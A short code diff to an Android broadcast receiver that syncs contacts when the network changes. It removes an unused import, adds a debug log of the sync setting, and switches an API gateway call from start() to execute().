@@ -5,7 +5,6 @@ import android.content.Context;
 import android.content.Intent;
 import android.util.Log;
 
-import com.theah64.xrob.asynctasks.ContactRefresher;
 import com.theah64.xrob.asynctasks.ContactsSynchronizer;
 import com.theah64.xrob.utils.APIRequestGateway;
 import com.theah64.xrob.utils.PrefUtils;
@@ -26,6 +25,8 @@ public class NetworkChangeReceiver extends BroadcastReceiver {
 
         final boolean isSyncContacts = PrefUtils.getInstance(context).getBoolean(PrefUtils.KEY_IS_SYNC_CONTACTS);
 
+        Log.d(X, "isSyncContacts : " + isSyncContacts);
+
         if (isSyncContacts) {
 
             new APIRequestGateway(context, new APIRequestGateway.APIRequestGatewayCallback() {
@@ -33,7 +34,7 @@ public class NetworkChangeReceiver extends BroadcastReceiver {
                 public void onReadyToRequest(String apiKey) {
                     new ContactsSynchronizer(context).execute(apiKey);
                 }
-            }).start();
+            }).execute();
         }
 
     }
